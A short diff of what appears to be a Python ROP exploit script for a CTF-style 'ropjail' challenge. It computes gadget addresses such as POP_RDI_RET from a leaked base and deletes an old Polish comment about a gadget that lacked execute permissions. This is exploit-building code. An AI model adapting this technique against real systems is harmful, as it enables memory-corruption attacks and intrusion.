@@ -26,7 +26,6 @@ ROPJAIL = int(parts[-1], 16)
 
 print("ROPJAIL ADDRESS: {}".format(hex(ROPJAIL)))
 
-# POP_RDI_RET = ROPJAIL + 0x11ac   # z randomowej tablicy - nie dziala, bo nie ma tam RX permów
 POP_RDI_RET = ROPJAIL - 0x2cbd
 RET_GADGET = ROPJAIL - 0x3046
 print("POP_RDI_RET ADDRESS: {}".format(hex(POP_RDI_RET)))
